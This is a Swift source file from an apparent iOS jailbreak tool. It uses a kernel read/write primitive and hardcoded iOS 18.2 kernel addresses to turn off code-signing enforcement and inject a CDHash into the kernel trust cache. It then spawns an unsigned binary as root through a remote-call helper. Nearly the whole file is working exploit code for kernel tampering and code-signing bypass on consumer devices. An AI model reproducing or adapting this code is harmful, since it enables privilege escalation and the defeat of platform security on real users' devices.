//
//  exp_tc_direct_inject.swift
//  DSPloit
//
//  SIMPLE APPROACH: Direct trust cache injection via KRW
//  ═══════════════════════════════════════════════════════
//
//  Skip ALL the complexity (amfid patch, IOKit, RemoteCall to daemons).
//  Just write the CDHash directly into kernel trust cache memory.
//
//  From Ghidra RE:
//    TC_SLOT_TABLE: 0xfffffff00798f600 (unslid)
//    This is a pointer table — each entry points to a trust_cache_module
//    The actual TC entries are in dynamically allocated modules
//
//  Strategy:
//    1. Find an existing trust cache module (follow pointers from slot table)
//    2. Write test (sentinel → verify → restore)
//    3. If writable: append our CDHash to the module
//    4. Increment count
//    5. Spawn unsigned binary
//
//  If the slot table itself is in __DATA_CONST (read-only), we try:
//    - Reading existing TC module pointers (they point to heap/writable memory)
//    - The TC MODULE data is often in writable kernel heap
//
//  Created by Royan | 2026-05-31
//

import Foundation
import CommonCrypto

final class ExpTCDirectInject {
    static let shared = ExpTCDirectInject()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(tc_direct) \(msg)")
    }
    
    // Known unslid addresses from Ghidra RE (iOS 18.2 kernelcache)
    // These are pointers TO trust cache modules, not the modules themselves
    private let UNSLID_TC_SLOT_TABLE: UInt64 = 0xfffffff00798f600
    
    // Trust cache v2 header: version(4) + uuid(16) + count(4) = 24 bytes
    // Then entries at stride 24: cdhash(20) + hash_type(1) + flags(1) + constraint(2)
    private let TC_HEADER_SIZE: UInt64 = 24
    private let TC_ENTRY_STRIDE: UInt64 = 24
    
    func run() {
        guard ds_is_ready() else { log("❌ KRW not active"); return }
        
        log("══════════════════════════════════════════")
        log("  Direct Trust Cache Inject (KRW only)")
        log("══════════════════════════════════════════")
        log("")
        
        let slide = ds_get_kernel_slide()
        let kernBase = ds_get_kernel_base()
        log("kernel base: 0x\(String(format: "%llx", kernBase))")
        log("kernel slide: 0x\(String(format: "%llx", slide))")
        log("")
        
        // ═══════════════════════════════════════════════════════════════
        // NOTE: DAT_fffffff007b79bd9 (amfi_only_platform_code) controls
        // whether kernel calls amfid. But it's in __DATA_CONST (KTRR).
        // Writing to it causes panic. DO NOT WRITE.
        // We must use trust cache injection instead.
        // ═══════════════════════════════════════════════════════════════
        
        // Ensure cs_enforcement_disable = 1 (proven writable)
        let csDisableAddr: UInt64 = 0xfffffff00a160798 &+ slide
        ds_kwrite32(csDisableAddr, 1)
        log("cs_enforcement_disable = 1 ✅")
        log("")
        
        // Step 1: Find a writable trust cache module
        log("[1/5] Scanning for trust cache modules...")
        
        let slotTableAddr = UNSLID_TC_SLOT_TABLE &+ slide
        log("  slot table: 0x\(String(format: "%llx", slotTableAddr))")
        
        // The slot table has entries for different TC types (stride 0x28)
        // Each slot contains a pointer to a linked list of trust_cache_module structs
        // Try reading first few slots
        var foundTC: UInt64 = 0
        var foundCount: UInt32 = 0
        var foundVersion: UInt32 = 0
        
        for slotIdx in 0..<20 {
            let slotAddr = slotTableAddr + UInt64(slotIdx) * 0x28
            
            // Safety: only read kernel VAs
            guard (slotAddr >> 32) > 0xFFFFFF00 else { continue }
            
            let ptr = ds_kread64(slotAddr)
            if ptr == 0 { continue }
            
            // Follow pointer — could be direct TC module or linked list node
            // Check if it looks like a kernel VA
            guard (ptr >> 32) > 0xFFFFFF00 || (ptr > 0x100000000 && ptr < 0x10000000000) else { continue }
            
            // Try reading as trust_cache_module header
            // Some structs have the TC at an offset (linked list has next/prev pointers first)
            for headerOff: UInt64 in [0, 0x8, 0x10, 0x18, 0x20, 0x28, 0x30] {
                let candidate = ptr + headerOff
                guard (candidate >> 32) > 0xFFFFFF00 || (candidate > 0x100000000 && candidate < 0x10000000000) else { continue }
                
                let ver = ds_kread32(candidate)
                if ver < 1 || ver > 3 { continue }
                
                // Skip UUID (16 bytes), read count
                let count = ds_kread32(candidate + 20)
                if count < 5 || count > 500000 { continue }
                
                // Validate: first entry should look like a CDHash (not all zeros, not all FF)
                let entry0_w0 = ds_kread64(candidate + TC_HEADER_SIZE)
                let entry0_w1 = ds_kread64(candidate + TC_HEADER_SIZE + 8)
                if entry0_w0 == 0 && entry0_w1 == 0 { continue }
                if entry0_w0 == 0xFFFFFFFFFFFFFFFF { continue }
                
                // Looks like a valid trust cache!
                log("  ✅ Found TC at slot[\(slotIdx)]+0x\(String(format: "%x", headerOff))")
                log("    addr: 0x\(String(format: "%llx", candidate))")
                log("    version: \(ver), count: \(count)")
                log("    entry[0]: \(String(format: "%016llx %016llx", entry0_w0, entry0_w1))")
                foundTC = candidate
                foundCount = count
                foundVersion = ver
                break
            }
            if foundTC != 0 { break }
        }
        
        if foundTC == 0 {
            log("")
            log("  Slot table scan failed. Trying symbol-based lookup...")
            
            // Try resolving via kcache symbol
            let tcSym = ds_kcache_symbol_runtime("_static_trust_cache")
            if tcSym != 0 {
                log("  _static_trust_cache: 0x\(String(format: "%llx", tcSym))")
                let ptr = ds_kread64(tcSym)
                if ptr != 0 && (ptr >> 32) > 0xFFFFFF00 {
                    let ver = ds_kread32(ptr)
                    let count = ds_kread32(ptr + 20)
                    if ver >= 1 && ver <= 3 && count >= 5 && count < 500000 {
                        foundTC = ptr
                        foundCount = count
                        foundVersion = ver
                        log("  ✅ Found via symbol: ver=\(ver) count=\(count)")
                    }
                }
            }
        }
        
        guard foundTC != 0 else {
            log("")
            log("❌ No trust cache found")
            log("   Try running 'Trust Cache Probe (Exp 77)' first")
            return
        }
        log("")
        
        // Step 2: Write test
        log("[2/5] Write test (safe — will restore)...")
        let testAddr = foundTC + TC_HEADER_SIZE + UInt64(foundCount) * TC_ENTRY_STRIDE
        log("  test addr: 0x\(String(format: "%llx", testAddr)) (slot after last entry)")
        
        let original = ds_kread64(testAddr)
        log("  original: 0x\(String(format: "%llx", original))")
        
        let sentinel: UInt64 = 0xDEADBEEFCAFEBABE
        ds_kwrite64(testAddr, sentinel)
        let readback = ds_kread64(testAddr)
        log("  readback: 0x\(String(format: "%llx", readback))")
        
        // Restore immediately
        ds_kwrite64(testAddr, original)
        
        guard readback == sentinel else {
            log("  ❌ WRITE FAILED (PPL/KTRR protects this memory)")
            log("")
            log("  Trust cache is in protected memory.")
            log("  Cannot inject directly via KRW.")
            log("")
            log("  This means we MUST use one of:")
            log("    - amfid NOP patch (blocked by exception ports)")
            log("    - IOKit TC load from entitled process (respring)")
            log("    - pmap_cs per-process flag (causes respring)")
            return
        }
        
        log("  ✅ WRITE TEST PASSED! Memory is writable!")
        log("")
        
        // Step 3: Build binary + compute CDHash
        log("[3/5] Building test binary...")
        let binary = buildMinimalBinary()
        let cdhash = sha256Truncated20(binary)
        log("  CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        
        // Write binary to disk
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/tc_direct_test"
        do {
            try binary.write(to: URL(fileURLWithPath: binPath))
            log("  ✅ Binary written to \(binPath)")
        } catch {
            log("  ❌ Write failed: \(error.localizedDescription)")
            return
        }
        log("")
        
        // Step 4: Inject CDHash into trust cache
        log("[4/5] Injecting CDHash into trust cache...")
        let injectAddr = foundTC + TC_HEADER_SIZE + UInt64(foundCount) * TC_ENTRY_STRIDE
        log("  inject addr: 0x\(String(format: "%llx", injectAddr))")
        
        // Write entry: cdhash[20] + hash_type(1) + flags(1) + constraint(2)
        var w0: UInt64 = 0
        var w1: UInt64 = 0
        var w2: UInt64 = 0
        cdhash.withUnsafeBytes { buf in
            memcpy(&w0, buf.baseAddress!, 8)
            memcpy(&w1, buf.baseAddress! + 8, 8)
            memcpy(&w2, buf.baseAddress! + 16, 4)
        }
        // hash_type = 2 (SHA256), flags = 0, constraint = 0
        w2 |= (2 << 32) // hash_type at byte 4 of w2
        
        ds_kwrite64(injectAddr, w0)
        ds_kwrite64(injectAddr + 8, w1)
        ds_kwrite64(injectAddr + 16, w2)
        
        // Verify entry written
        let v0 = ds_kread64(injectAddr)
        let v1 = ds_kread64(injectAddr + 8)
        let v2 = ds_kread64(injectAddr + 16)
        log("  written: \(String(format: "%016llx %016llx %016llx", v0, v1, v2))")
        
        guard v0 == w0 && v1 == w1 else {
            log("  ❌ Entry write failed!")
            return
        }
        log("  ✅ CDHash entry written")
        
        // Increment count
        let oldCount = ds_kread32(foundTC + 20)
        ds_kwrite32(foundTC + 20, oldCount + 1)
        let newCount = ds_kread32(foundTC + 20)
        log("  count: \(oldCount) → \(newCount)")
        
        guard newCount == oldCount + 1 else {
            log("  ❌ Count increment failed (PPL?)")
            // Restore entry
            ds_kwrite64(injectAddr, 0)
            ds_kwrite64(injectAddr + 8, 0)
            ds_kwrite64(injectAddr + 16, 0)
            return
        }
        log("  ✅ Trust cache updated!")
        log("")
        
        // Step 5: Spawn via launchd
        log("[5/5] Spawning unsigned binary via launchd...")
        spawnTest(binPath: binPath)
    }
    
    // MARK: - Spawn Test
    
    #if !DISABLE_REMOTECALL
    private func spawnTest(binPath: String) {
        RootExecutor.shared.executeAsRoot(operation: "tc_direct_spawn") { [weak self] rc in
            guard let self else { return (false, "self nil", 0) }
            
            let pathAddr = remote_alloc_str(rc, binPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if ret == 0 && pid != 0 {
                self.log("")
                self.log("╔══════════════════════════════════════╗")
                self.log("║  ✅ UNSIGNED BINARY SPAWNED!         ║")
                self.log("║  PID = \(pid)")
                self.log("║  🎉 FULL JAILBREAK ACHIEVED!        ║")
                self.log("╚══════════════════════════════════════╝")
                return (true, "SPAWNED! pid=\(pid)", UInt64(pid))
            } else {
                self.log("❌ Spawn failed: ret=\(ret) pid=\(pid)")
                self.log("   AMFI may still be checking (TC inject didn't help)")
                self.log("   Or: CDHash mismatch (binary changed after hash)")
                return (false, "ret=\(ret) pid=\(pid)", UInt64(ret))
            }
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 10) { [weak self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "tc_direct_spawn" {
                self?.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
            }
        }
    }
    #else
    private func spawnTest(binPath: String) {
        log("❌ DISABLE_REMOTECALL")
    }
    #endif
    
    // MARK: - Helpers
    
    private func sha256Truncated20(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
    
    private func buildMinimalBinary() -> Data {
        var bin = Data()
        // Mach-O header (arm64, MH_EXECUTE)
        bin.append(contentsOf: [
            0xCF, 0xFA, 0xED, 0xFE,  // magic
            0x0C, 0x00, 0x00, 0x01,  // cpu_type = ARM64
            0x00, 0x00, 0x00, 0x00,  // cpu_subtype
            0x02, 0x00, 0x00, 0x00,  // filetype = MH_EXECUTE
            0x02, 0x00, 0x00, 0x00,  // ncmds = 2
            0x60, 0x01, 0x00, 0x00,  // sizeofcmds
            0x00, 0x00, 0x00, 0x00,  // flags
            0x00, 0x00, 0x00, 0x00   // reserved
        ])
        // LC_SEGMENT_64 for __TEXT
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28] = 0x01 // vmaddr high byte = 0x100000000
        seg[32]=0x00;seg[33]=0x40 // vmsize = 0x4000
        seg[40]=0x00;seg[41]=0x40 // filesize = 0x4000
        seg[48] = 0x05 // maxprot = r-x
        seg[52] = 0x05 // initprot = r-x
        bin.append(contentsOf: seg)
        // LC_UNIXTHREAD
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01 // PC = 0x100000180
        bin.append(contentsOf: thr)
        // Pad to entry point
        while bin.count < 0x180 { bin.append(0) }
        // Code: exit(0)
        bin.append(contentsOf: [
            0x00, 0x00, 0x80, 0xD2,  // mov x0, #0
            0x30, 0x00, 0x80, 0xD2,  // mov x16, #1
            0x01, 0x10, 0x00, 0xD4   // svc #0x80
        ])
        // Pad to page
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
